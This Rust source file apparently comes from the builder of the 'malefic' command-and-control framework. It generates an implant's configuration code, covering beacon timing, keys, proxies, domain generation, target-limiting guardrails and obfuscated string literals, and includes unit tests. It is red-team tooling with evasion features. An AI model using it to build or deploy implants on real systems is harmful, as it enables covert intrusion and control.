use crate::config::{BasicConfig, BuildConfig, GuardrailConfig, ImplantConfig, TargetConfig};
use crate::{log_info, log_step, log_success, log_warning};
use anyhow::Context;
use chrono::Local;
use std::fs;
use std::fs::File;
use std::io::Write;
use std::path::Path;
use url::Url;

static CONFIG_CORE_RS_PATH: &str = "malefic-crates/config/src/lib.rs";

// Protocol defaults
const DEFAULT_TLS_PORT: &str = ":443";
const DEFAULT_HTTP_PROXY_PORT: u16 = 8080;
const DEFAULT_SOCKS_PROXY_PORT: u16 = 1080;

// REM transport
const REM_LINK_PREFIX: &str = "-l memory+socks://:@memory -c ";

fn default_proxy_port(scheme: &str) -> u16 {
    match scheme {
        "http" | "https" => DEFAULT_HTTP_PROXY_PORT,
        "socks5" | "socks" => DEFAULT_SOCKS_PROXY_PORT,
        _ => DEFAULT_HTTP_PROXY_PORT,
    }
}

fn obf_or_plain_expr(value: &str, _use_obfstr: bool) -> String {
    // Protection is now automatic via LiteralObfuscator in lazy_static! macro.
    // The macro transforms "lit".to_string() → obf_string!("lit") at compile time.
    format!("{:?}.to_string()", value)
}

fn bytes_expr(value: &str, _use_obfstr: bool) -> String {
    // Protection is now automatic via LiteralObfuscator in lazy_static! macro.
    // "lit".to_string() → obf_string!("lit"), then .into_bytes() converts to Vec<u8>.
    format!("{:?}.to_string().into_bytes()", value)
}

fn backup_generated_file(path: &str) {
    let path = Path::new(path);
    if !path.exists() {
        return;
    }

    let Some(file_name) = path.file_name().and_then(|name| name.to_str()) else {
        log_warning!(
            "Failed to determine filename for '{}', skipping backup",
            path.display()
        );
        return;
    };

    let timestamp = Local::now().format("%Y%m%d%H%M%S").to_string();
    let mut candidate_name = format!("{file_name}.backup-{timestamp}");
    let mut candidate_path = path.with_file_name(&candidate_name);
    let mut suffix = 2u32;

    while candidate_path.exists() {
        candidate_name = format!("{file_name}.backup-{timestamp}-v{suffix}");
        candidate_path = path.with_file_name(&candidate_name);
        suffix += 1;
    }

    match fs::copy(path, &candidate_path) {
        Ok(_) => log_info!(
            "Backed up '{}' to '{}'",
            path.display(),
            candidate_path.display()
        ),
        Err(err) => log_warning!(
            "Failed to backup '{}' to '{}': {}",
            path.display(),
            candidate_path.display(),
            err
        ),
    }
}

pub fn update_core_config(
    server: &BasicConfig,
    implant_config: &ImplantConfig,
    build_config: Option<&BuildConfig>,
) -> anyhow::Result<()> {
    log_step!("Updating core configuration...");

    // Validate configuration
    server
        .validate_targets()
        .context("Configuration validation failed")?;

    // When mod is bind, only tcp or udp protocols are allowed
    if implant_config.r#mod.to_lowercase() == "bind" {
        for (index, target) in server.targets.iter().enumerate() {
            let protocol = target.detect_protocol();
            if protocol != "tcp" && protocol != "udp" {
                anyhow::bail!(
                    "Target {} uses '{}' protocol, but bind mode only supports tcp/udp",
                    index,
                    protocol
                );
            }
        }
    }

    backup_generated_file(CONFIG_CORE_RS_PATH);
    let mut file = File::create(CONFIG_CORE_RS_PATH)
        .with_context(|| format!("Failed to create {}", CONFIG_CORE_RS_PATH))?;

    // Generate configuration content
    let use_obfstr = build_config.map(|cfg| cfg.obfstr).unwrap_or(true);
    let config_content = generate_multi_protocol_config(server, use_obfstr);

    file.write_all(config_content.as_bytes())
        .context("Failed to write config file")?;

    log_success!("Core configuration has been updated successfully");
    Ok(())
}

fn generate_multi_protocol_config(server: &BasicConfig, use_obfstr: bool) -> String {
    let mut config = String::new();

    // Generate module imports
    config.push_str(&generate_module_imports(server));

    // Generate lazy_static blocks with inline RuntimeConfig construction
    config.push_str(&generate_public_config_section(server, use_obfstr));

    config
}

fn generate_runtime_config_inline_expr(server: &BasicConfig, use_obfstr: bool) -> String {
    let proxy = &server.proxy;
    let mut proxy_scheme = String::new();
    let mut proxy_host = String::new();
    let mut proxy_port = String::new();
    let mut proxy_username = String::new();
    let mut proxy_password = String::new();
    if !proxy.url.is_empty() {
        if let Ok(proxy_url) = Url::parse(&proxy.url) {
            proxy_scheme = proxy_url.scheme().to_string();
            proxy_host = proxy_url.host_str().unwrap_or("").to_string();
            proxy_port = proxy_url
                .port()
                .map(|p| p.to_string())
                .unwrap_or_else(|| default_proxy_port(&proxy_scheme).to_string());
            proxy_username = proxy_url.username().to_string();
            proxy_password = proxy_url.password().unwrap_or("").to_string();
        }
    }

    let guardrail_expr = generate_guardrail_config_expr(&server.guardrail, use_obfstr);
    let server_configs_expr = generate_server_configs_expr(server, use_obfstr);
    let dga_key_expr = if server.dga.enable {
        obf_or_plain_expr(&server.dga.key, use_obfstr)
    } else {
        "String::new()".to_string()
    };

    format!(
        r#"load_runtime_config(RuntimeConfig {{
        cron: {cron},
        jitter: {jitter}f64,
        keepalive: {keepalive},
        retry: {retry}u32,
        max_cycles: {max_cycles}i32,
        name: {name},
        key: {key},
        use_env_proxy: {use_env_proxy},
        proxy_url: {proxy_url},
        proxy_scheme: {proxy_scheme},
        proxy_host: {proxy_host},
        proxy_port: {proxy_port},
        proxy_username: {proxy_username},
        proxy_password: {proxy_password},
        dga_enable: {dga_enable},
        dga_key: {dga_key},
        dga_interval_hours: {dga_interval_hours}u32,
        guardrail: {guardrail},
        server_configs: {server_configs},
        max_packet_length: {max_packet_length}usize,
    }})"#,
        cron = obf_or_plain_expr(&server.cron, use_obfstr),
        jitter = server.jitter,
        retry = server.retry,
        max_cycles = server.max_cycles.unwrap_or(-1),
        name = obf_or_plain_expr(&server.name, use_obfstr),
        key = bytes_expr(&server.key, use_obfstr),
        use_env_proxy = proxy.use_env_proxy,
        proxy_url = obf_or_plain_expr(&proxy.url, use_obfstr),
        proxy_scheme = obf_or_plain_expr(&proxy_scheme, use_obfstr),
        proxy_host = obf_or_plain_expr(&proxy_host, use_obfstr),
        proxy_port = obf_or_plain_expr(&proxy_port, use_obfstr),
        proxy_username = obf_or_plain_expr(&proxy_username, use_obfstr),
        proxy_password = obf_or_plain_expr(&proxy_password, use_obfstr),
        dga_enable = server.dga.enable,
        dga_key = dga_key_expr,
        dga_interval_hours = server.dga.interval_hours,
        keepalive = server.keepalive,
        guardrail = guardrail_expr,
        server_configs = server_configs_expr,
        max_packet_length = server.max_packet_length,
    )
}

fn generate_public_config_section(server: &BasicConfig, use_obfstr: bool) -> String {
    let runtime_config_expr = generate_runtime_config_inline_expr(server, use_obfstr);
    let (age_priv_expr, age_pub_expr) = if server.secure.enable {
        (
            obf_or_plain_expr(&server.secure.private_key, use_obfstr),
            obf_or_plain_expr(&server.secure.public_key, use_obfstr),
        )
    } else {
        ("String::new()".to_string(), "String::new()".to_string())
    };
    let mut config = String::new();
    config.push_str(&format!(
        r#"lazy_static! {{
    pub static ref RUNTIME_CONFIG: RuntimeConfig = {runtime_config_expr};
    // Basic configuration
    pub static ref CRON: String = RUNTIME_CONFIG.cron.clone();
    pub static ref JITTER: f64 = RUNTIME_CONFIG.jitter;
    pub static ref KEEPALIVE: bool = RUNTIME_CONFIG.keepalive;
    // Target server fault tolerance configuration
    pub static ref RETRY: u32 = RUNTIME_CONFIG.retry;
    pub static ref MAX_CYCLES: i32 = RUNTIME_CONFIG.max_cycles;
    // Encryption configuration
    pub static ref NAME: String = RUNTIME_CONFIG.name.clone();
    pub static ref KEY: Vec<u8> = RUNTIME_CONFIG.key.clone();
    // Proxy configuration
    pub static ref USE_ENV_PROXY: bool = RUNTIME_CONFIG.use_env_proxy;
    pub static ref PROXY_URL: String = RUNTIME_CONFIG.proxy_url.clone();
    pub static ref PROXY_SCHEME: String = RUNTIME_CONFIG.proxy_scheme.clone();
    pub static ref PROXY_HOST: String = RUNTIME_CONFIG.proxy_host.clone();
    pub static ref PROXY_PORT: String = RUNTIME_CONFIG.proxy_port.clone();
    pub static ref PROXY_USERNAME: String = RUNTIME_CONFIG.proxy_username.clone();
    pub static ref PROXY_PASSWORD: String = RUNTIME_CONFIG.proxy_password.clone();
    // DGA configuration
    pub static ref DGA_ENABLE: bool = RUNTIME_CONFIG.dga_enable;
    pub static ref DGA_KEY: String = RUNTIME_CONFIG.dga_key.clone();
    pub static ref DGA_INTERVAL_HOURS: u32 = RUNTIME_CONFIG.dga_interval_hours;
    // Guardrail configuration
    pub static ref GUARDRAIL_CONFIG: GuardrailConfig = RUNTIME_CONFIG.guardrail.clone();
    // Multi-server configuration - use Vec to maintain configuration order
    pub static ref SERVER_CONFIGS: Vec<ServerConfig> = RUNTIME_CONFIG.server_configs.clone();
    // Packet chunking configuration
    pub static ref MAX_PACKET_LENGTH: usize = RUNTIME_CONFIG.max_packet_length;
}}

#[cfg(feature = "secure")]
lazy_static! {{
    pub static ref AGE_PRIVATE_KEY: String = {age_priv};
    pub static ref AGE_PUBLIC_KEY: String = {age_pub};
"#,
        age_priv = age_priv_expr,
        age_pub = age_pub_expr,
    ));
    config.push_str("}\n");

    config
}

fn generate_guardrail_config_expr(guardrail_config: &GuardrailConfig, use_obfstr: bool) -> String {
    if !guardrail_config.enable {
        return r#"GuardrailConfig {
            ip_addresses: Vec::new(),
            usernames: Vec::new(),
            server_names: Vec::new(),
            domains: Vec::new(),
            require_all: true,
        }"#
        .to_string();
    }

    let ip_addresses = guardrail_config
        .ip_addresses
        .iter()
        .map(|ip| obf_or_plain_expr(ip, use_obfstr))
        .collect::<Vec<_>>()
        .join(", ");
    let usernames = guardrail_config
        .usernames
        .iter()
        .map(|user| obf_or_plain_expr(user, use_obfstr))
        .collect::<Vec<_>>()
        .join(", ");
    let server_names = guardrail_config
        .server_names
        .iter()
        .map(|server| obf_or_plain_expr(server, use_obfstr))
        .collect::<Vec<_>>()
        .join(", ");
    let domains = guardrail_config
        .domains
        .iter()
        .map(|domain| obf_or_plain_expr(domain, use_obfstr))
        .collect::<Vec<_>>()
        .join(", ");

    format!(
        r#"GuardrailConfig {{
            ip_addresses: [{ip_addresses}].to_vec(),
            usernames: [{usernames}].to_vec(),
            server_names: [{server_names}].to_vec(),
            domains: [{domains}].to_vec(),
            require_all: {require_all},
        }}"#,
        ip_addresses = ip_addresses,
        usernames = usernames,
        server_names = server_names,
        domains = domains,
        require_all = guardrail_config.require_all
    )
}

fn generate_server_configs_expr(server: &BasicConfig, use_obfstr: bool) -> String {
    let mut expr = String::new();
    expr.push_str("{\n            let mut configs = Vec::new();\n");
    for (idx, target) in server.targets.iter().enumerate() {
        expr.push_str(&generate_single_server_config_expr(
            target, server, use_obfstr, idx,
        ));
    }
    expr.push_str("            configs\n        }");
    expr
}

fn generate_single_server_config_expr(
    target: &TargetConfig,
    basic_config: &BasicConfig,
    use_obfstr: bool,
    _index: usize,
) -> String {
    let protocol = target.detect_protocol();
    let protocol_type = match protocol.as_str() {
        "http" => "Http",
        "tcp" => "Tcp",
        "rem" => "REM",
        _ => "Tcp",
    };

    let address_expr = obf_or_plain_expr(&target.address, use_obfstr);

    let mut config = String::from("            {\n");
    config.push_str(&generate_transport_config(target, use_obfstr));
    config.push_str(&generate_session_config_block(
        target,
        basic_config,
        use_obfstr,
    ));
    config.push_str(&format!(
        r#"                configs.push(
                    ServerConfig {{
                        address: {address},
                        protocol: ProtocolType::{protocol},
                        session_config,
                        transport_config,
"#,
        address = address_expr,
        protocol = protocol_type
    ));

    config.push_str(&generate_tls_config_for_target(
        target,
        basic_config,
        use_obfstr,
    ));
    config.push_str(&generate_proxy_config_for_target(
        target,
        basic_config,
        use_obfstr,
    ));
    config.push_str(&generate_domain_suffix_config(target, use_obfstr));

    config.push_str("                    }\n");
    config.push_str("                );\n");
    config.push_str("            }\n\n");
    config
}

fn generate_module_imports(server: &BasicConfig) -> String {
    let needs_http = server.targets.iter().any(|target| target.http.is_some());

    let mut imports = String::new();
    imports.push_str(
        r#"mod config;
mod runtime;
"#,
    );
    if needs_http {
        imports.push_str("use std::collections::HashMap;\n");
    }
    imports.push_str("use std::time::Duration;\n");
    imports.push_str(
        r#"
pub use config::{
    ServerConfig,
    ProtocolType,
    SessionConfig,
    TransportConfig,
    // TCP
    TcpConfig,
    SocketOptions,
    // HTTP
    HttpRequestConfig,
    // REM
    RemConfig,
    // TLS
    MTLSConfig,
    TlsConfig,
    ProxyConfig,
    // Guardrail
    GuardrailConfig,
};
pub use runtime::{
    BlobError,
    ConfigBlobText,
    RuntimeConfig,
    CONFIG_BLOB_B64_LEN,
    CONFIG_BLOB_TEXT,
    CONFIG_BLOB_TEXT_LEN,
    decode_runtime_config_bytes,
    decode_runtime_config_str,
    get_transport_key,
    load_runtime_config,
    update_runtime_key,
};
#[cfg(feature = "encoder")]
pub use runtime::encode_runtime_config;
use malefic_gateway::lazy_static;

"#,
    );

    imports
}

fn generate_transport_config(target: &TargetConfig, use_obfstr: bool) -> String {
    if let Some(http_config) = &target.http {
        let _host = target.get_host();
        let mut headers_code = String::new();

        // Generate Host header
        headers_code.push_str(&format!(
            "                        headers.insert({}, {});\n",
            obf_or_plain_expr("Host", use_obfstr),
            obf_or_plain_expr(&target.address, use_obfstr)
        ));

        // Generate other headers
        for (key, value) in &http_config.headers {
            if key != "Host" {
                // Host is already handled separately
                headers_code.push_str(&format!(
                    "                        headers.insert({}, {});\n",
                    obf_or_plain_expr(key, use_obfstr),
                    obf_or_plain_expr(value, use_obfstr)
                ));
            }
        }

        format!(
            r#"                let transport_config = TransportConfig::Http({{
                    let mut http_config = HttpRequestConfig::new({method}, {path}, {version});
                    http_config.headers = {{
                        let mut headers = HashMap::new();
{headers}                        headers
                    }};
{tuning}                    http_config
                }});
"#,
            method = obf_or_plain_expr(&http_config.method, use_obfstr),
            path = obf_or_plain_expr(&http_config.path, use_obfstr),
            version = obf_or_plain_expr(&http_config.version, use_obfstr),
            headers = headers_code,
            tuning = format!(
                "{}{}",
                http_config
                    .response_read_chunk_size
                    .map(|size| format!(
                        "                    http_config.response_read_chunk_size = {size};\n"
                    ))
                    .unwrap_or_default(),
                http_config
                    .response_retry_delay_ms
                    .map(|millis| format!(
                        "                    http_config.response_retry_delay = Duration::from_millis({millis});\n"
                    ))
                    .unwrap_or_default()
            )
        )
    } else if let Some(rem_config) = &target.rem {
        format!(
            r#"                let transport_config = TransportConfig::Rem(
                    RemConfig::new({link})
                );
"#,
            link = obf_or_plain_expr(
                &format!("{}{}", REM_LINK_PREFIX, rem_config.link),
                use_obfstr
            )
        )
    } else {
        // Default TCP configuration
        "                let transport_config = TransportConfig::Tcp(TcpConfig {});\n".to_string()
    }
}

fn generate_session_config_block(
    target: &TargetConfig,
    basic_config: &BasicConfig,
    _use_obfstr: bool,
) -> String {
    let mut session = format!(
        "                let mut session_config = SessionConfig::default_for_transport(&transport_config, {});\n",
        basic_config.keepalive
    );

    if let Some(session_config) = &target.session {
        if let Some(read_chunk_size) = session_config.read_chunk_size {
            session.push_str(&format!(
                "                session_config.read_chunk_size = {read_chunk_size};\n"
            ));
        }
        if let Some(deadline_ms) = session_config.deadline_ms {
            session.push_str(&format!(
                "                session_config.deadline = Duration::from_millis({deadline_ms});\n"
            ));
        }
        if let Some(connect_timeout_ms) = session_config.connect_timeout_ms {
            session.push_str(&format!(
                "                session_config.connect_timeout = Duration::from_millis({connect_timeout_ms});\n"
            ));
        }
        if let Some(keepalive) = session_config.keepalive {
            session.push_str(&format!(
                "                session_config.keepalive = {keepalive};\n"
            ));
        }
    }

    session
}

fn generate_tls_config_for_target(
    target: &TargetConfig,
    _basic_config: &BasicConfig,
    use_obfstr: bool,
) -> String {
    // Directly handle target.tls Option
    if let Some(tls_config) = &target.tls {
        if tls_config.enable {
            let sni = if tls_config.sni.is_empty() {
                target.get_host()
            } else {
                tls_config.sni.clone()
            };

            let mtls_code = if let Some(mtls) = &tls_config.mtls {
                format!(
                    r#"mtls_config: Some(MTLSConfig {{
                            enable: true,
                            client_cert: include_bytes!("{}").to_vec(),
                            client_key: include_bytes!("{}").to_vec(),
                            server_ca: include_bytes!("{}").to_vec(),
                        }}),
"#,
                    mtls.client_cert, mtls.client_key, mtls.server_ca
                )
            } else {
                "mtls_config: None,\n".to_string()
            };

            let server_ca_code = if let Some(ref ca_path) = tls_config.server_ca {
                if !ca_path.is_empty() {
                    format!(r#"server_ca: include_bytes!("{}").to_vec(),"#, ca_path)
                } else {
                    "server_ca: Vec::new(),".to_string()
                }
            } else {
                "server_ca: Vec::new(),".to_string()
            };

            let tls_code = format!(
                r#"                tls_config: Some(TlsConfig {{
                        enable: true,
                        version: {version},
                        sni: {sni},
                        skip_verification: {skip_verification},
                        {server_ca}
                        {mtls}
                    }}),
"#,
                version = obf_or_plain_expr(&tls_config.version, use_obfstr),
                sni = obf_or_plain_expr(&sni, use_obfstr),
                skip_verification = tls_config.skip_verification,
                server_ca = server_ca_code,
                mtls = mtls_code
            );

            tls_code
        } else {
            "                tls_config: None,\n".to_string()
        }
    } else {
        // Target has no TLS configuration, return None
        "                tls_config: None,\n".to_string()
    }
}

fn generate_proxy_config_for_target(
    target: &TargetConfig,
    basic_config: &BasicConfig,
    use_obfstr: bool,
) -> String {
    // Prioritize target-specific proxy configuration, otherwise use global configuration
    let proxy_config = target.proxy.as_ref().unwrap_or(&basic_config.proxy);

    // Check if there is a proxy configuration
    if !proxy_config.url.is_empty() {
        if let Ok(proxy_url) = Url::parse(&proxy_config.url) {
            format!(
                r#"                proxy_config: Some(ProxyConfig {{
                    proxy_type: "{}".to_string(),
                    host: {},
                    port: {},
                    username: {},
                    password: {},
                }}),
"#,
                proxy_url.scheme(),
                obf_or_plain_expr(proxy_url.host_str().unwrap_or(""), use_obfstr),
                proxy_url
                    .port()
                    .unwrap_or_else(|| default_proxy_port(proxy_url.scheme())),
                obf_or_plain_expr(proxy_url.username(), use_obfstr),
                obf_or_plain_expr(proxy_url.password().unwrap_or(""), use_obfstr)
            )
        } else {
            "                proxy_config: None,\n".to_string()
        }
    } else {
        "                proxy_config: None,\n".to_string()
    }
}

fn generate_domain_suffix_config(target: &TargetConfig, use_obfstr: bool) -> String {
    if let Some(ref suffix) = target.domain_suffix {
        format!(
            r#"                domain_suffix: Some({}),
"#,
            obf_or_plain_expr(suffix, use_obfstr)
        )
    } else {
        "                domain_suffix: None,\n".to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::*;

    /// Minimal BasicConfig for testing codegen output (not file I/O).
    fn test_basic_config() -> BasicConfig {
        BasicConfig {
            name: "test".to_string(),
            targets: vec![],
            proxy: ProxyConfig::default(),
            cron: "*/5 * * * * * *".to_string(),
            jitter: 0.0,
            keepalive: false,
            encryption: "aes".to_string(),
            key: "testkey".to_string(),
            retry: 3,
            max_cycles: Some(-1),
            dga: DgaConfig::default(),
            guardrail: GuardrailConfig::default(),
            secure: SecureConfig {
                enable: false,
                private_key: String::new(),
                public_key: String::new(),
            },
            max_packet_length: 0,
        }
    }

    // ================================================================
    // Regression: generate_module_imports uses malefic_gateway
    // ================================================================

    #[test]
    fn test_imports_use_malefic_gateway_lazy_static() {
        let imports = generate_module_imports(&test_basic_config());
        assert!(
            imports.contains("use malefic_gateway::lazy_static;"),
            "generated imports must use malefic_gateway::lazy_static, got:\n{}",
            imports
        );
    }

    #[test]
    fn test_imports_no_old_lazy_static_crate() {
        let imports = generate_module_imports(&test_basic_config());
        assert!(
            !imports.contains("use lazy_static::lazy_static;"),
            "generated imports must NOT reference the old lazy_static crate, got:\n{}",
            imports
        );
    }

    // ================================================================
    // Regression: generate_public_config_section uses lazy_static! macro
    // ================================================================

    #[test]
    fn test_public_config_section_uses_lazy_static_macro() {
        let server = test_basic_config();
        let section = generate_public_config_section(&server, false);
        assert!(
            section.starts_with("lazy_static! {"),
            "generated config section must invoke lazy_static! macro, got:\n{}",
            section
        );
    }

    #[test]
    fn test_public_config_section_contains_runtime_config() {
        let server = test_basic_config();
        let section = generate_public_config_section(&server, false);
        assert!(
            section.contains("pub static ref RUNTIME_CONFIG: RuntimeConfig"),
            "generated config section must define RUNTIME_CONFIG"
        );
    }

    #[test]
    fn test_public_config_section_contains_all_config_statics() {
        let server = test_basic_config();
        let section = generate_public_config_section(&server, false);
        let expected_statics = [
            "RUNTIME_CONFIG",
            "CRON",
            "JITTER",
            "KEEPALIVE",
            "RETRY",
            "MAX_CYCLES",
            "NAME",
            "KEY",
            "USE_ENV_PROXY",
            "PROXY_URL",
            "PROXY_SCHEME",
            "PROXY_HOST",
            "PROXY_PORT",
            "PROXY_USERNAME",
            "PROXY_PASSWORD",
            "DGA_ENABLE",
            "DGA_KEY",
            "DGA_INTERVAL_HOURS",
            "GUARDRAIL_CONFIG",
            "SERVER_CONFIGS",
        ];
        for name in &expected_statics {
            assert!(
                section.contains(&format!("pub static ref {name}:")),
                "generated config section must define {name}"
            );
        }
    }

    #[test]
    fn test_public_config_section_has_empty_age_keys_when_secure_disabled() {
        let server = test_basic_config();
        let section = generate_public_config_section(&server, false);
        assert!(
            section.contains("#[cfg(feature = \"secure\")]"),
            "secure config statics must be gated by the config feature"
        );
        assert!(
            section.contains("AGE_PRIVATE_KEY"),
            "AGE_PRIVATE_KEY must exist even when secure config is empty"
        );
        assert!(
            section.contains("String::new()"),
            "secure statics must fall back to empty strings when secure config is disabled"
        );
    }

    #[test]
    fn test_public_config_section_has_age_keys_when_secure_enabled() {
        let mut server = test_basic_config();
        server.secure.enable = true;
        server.secure.private_key = "test_priv".to_string();
        server.secure.public_key = "test_pub".to_string();
        let section = generate_public_config_section(&server, false);
        assert!(
            section.contains("AGE_PRIVATE_KEY"),
            "AGE_PRIVATE_KEY must appear when secure is enabled"
        );
        assert!(
            section.contains("AGE_PUBLIC_KEY"),
            "AGE_PUBLIC_KEY must appear when secure is enabled"
        );
        assert!(
            section.contains("#[cfg(feature = \"secure\")]"),
            "secure config statics must be gated by the config feature"
        );
        assert!(section.contains(r#""test_priv".to_string()"#));
        assert!(section.contains(r#""test_pub".to_string()"#));
    }

    // ================================================================
    // Regression: full generated config uses new import
    // ================================================================

    #[test]
    fn test_full_config_output_uses_new_lazy_static() {
        let server = test_basic_config();
        let full = generate_multi_protocol_config(&server, false);
        assert!(
            full.contains("use malefic_gateway::lazy_static;"),
            "full generated config must import from malefic_gateway"
        );
        assert!(
            !full.contains("use lazy_static::lazy_static;"),
            "full generated config must NOT import from lazy_static crate"
        );
        assert!(
            full.contains("lazy_static! {"),
            "full generated config must contain lazy_static! invocation"
        );
    }

    #[test]
    fn test_full_config_has_closing_brace() {
        let server = test_basic_config();
        let full = generate_multi_protocol_config(&server, false);
        assert!(
            full.ends_with("}\n"),
            "full generated config must end with closing brace"
        );
    }

    // ================================================================
    // obf_or_plain_expr / bytes_expr — always emit plain form now
    // ================================================================

    #[test]
    fn test_obf_or_plain_expr_always_plain() {
        // use_obfstr=false
        let result_false = obf_or_plain_expr("hello", false);
        assert_eq!(result_false, r#""hello".to_string()"#);
        // use_obfstr=true — same output, obfstr no longer used
        let result_true = obf_or_plain_expr("hello", true);
        assert_eq!(result_true, r#""hello".to_string()"#);
    }

    #[test]
    fn test_obf_or_plain_expr_no_obfstr() {
        let result = obf_or_plain_expr("secret", true);
        assert!(
            !result.contains("obfstr"),
            "obf_or_plain_expr must NOT emit obfstr, protection is now automatic via LiteralObfuscator"
        );
    }

    #[test]
    fn test_bytes_expr_always_plain() {
        let result_false = bytes_expr("key", false);
        assert!(result_false.contains(".to_string().into_bytes()"));
        let result_true = bytes_expr("key", true);
        assert!(result_true.contains(".to_string().into_bytes()"));
    }

    #[test]
    fn test_bytes_expr_no_obfstr() {
        let result = bytes_expr("key", true);
        assert!(
            !result.contains("obfstr"),
            "bytes_expr must NOT emit obfstr"
        );
    }

    // ================================================================
    // Plan B: RuntimeConfig inlined in lazy_static init
    // ================================================================

    #[test]
    fn test_no_default_runtime_config_fn() {
        let server = test_basic_config();
        let full = generate_multi_protocol_config(&server, false);
        assert!(
            !full.contains("fn default_runtime_config()"),
            "default_runtime_config function must NOT be generated (inlined into lazy_static)"
        );
    }

    #[test]
    fn test_runtime_config_inlined_in_lazy_static() {
        let server = test_basic_config();
        let full = generate_multi_protocol_config(&server, false);
        assert!(
            full.contains("load_runtime_config(RuntimeConfig {"),
            "RuntimeConfig must be constructed inline in lazy_static init, got:\n{}",
            full
        );
    }

    #[test]
    fn test_runtime_config_inline_contains_config_values() {
        let server = test_basic_config();
        let expr = generate_runtime_config_inline_expr(&server, false);
        // String fields emit "value".to_string()
        assert!(expr.contains(r#""*/5 * * * * * *".to_string()"#));
        assert!(expr.contains(r#""test".to_string()"#));
        assert!(expr.contains("keepalive: false"));
        // No obfstr anywhere
        assert!(!expr.contains("obfstr"));
    }

    // ================================================================
    // Plan D: typed integer suffixes
    // ================================================================

    #[test]
    fn test_runtime_config_inline_has_typed_integers() {
        let server = test_basic_config();
        let expr = generate_runtime_config_inline_expr(&server, false);
        assert!(
            expr.contains("3u32"),
            "retry must have u32 suffix, got:\n{}",
            expr
        );
        assert!(
            expr.contains("-1i32"),
            "max_cycles must have i32 suffix, got:\n{}",
            expr
        );
        assert!(
            expr.contains("0.0f64") || expr.contains("0f64"),
            "jitter must have f64 suffix, got:\n{}",
            expr
        );
    }

    #[test]
    fn test_runtime_config_inline_dga_interval_typed() {
        let mut server = test_basic_config();
        server.dga.interval_hours = 24;
        let expr = generate_runtime_config_inline_expr(&server, false);
        assert!(
            expr.contains("24u32"),
            "dga_interval_hours must have u32 suffix"
        );
    }

    // ================================================================
    // Guardrail: [].to_vec() instead of vec![]
    // ================================================================

    #[test]
    fn test_guardrail_disabled_uses_vec_new() {
        let guardrail = GuardrailConfig::default();
        let expr = generate_guardrail_config_expr(&guardrail, false);
        assert!(expr.contains("Vec::new()"));
        assert!(!expr.contains("vec!"));
    }

    #[test]
    fn test_guardrail_enabled_uses_array_to_vec() {
        let guardrail = GuardrailConfig {
            enable: true,
            require_all: true,
            ip_addresses: vec!["1.2.3.4".to_string()],
            usernames: vec!["admin".to_string()],
            server_names: vec![],
            domains: vec!["example.com".to_string()],
        };
        let expr = generate_guardrail_config_expr(&guardrail, false);
        // Must use [].to_vec() not vec![]
        assert!(
            !expr.contains("vec!["),
            "guardrail must NOT use vec![] macro (LiteralObfuscator can't traverse macro bodies)"
        );
        assert!(
            expr.contains("].to_vec()"),
            "guardrail must use [].to_vec() for auto-obfuscation"
        );
        // Values must be plain .to_string() (auto-protected by LiteralObfuscator)
        assert!(expr.contains(r#""1.2.3.4".to_string()"#));
        assert!(expr.contains(r#""admin".to_string()"#));
        assert!(expr.contains(r#""example.com".to_string()"#));
    }
}
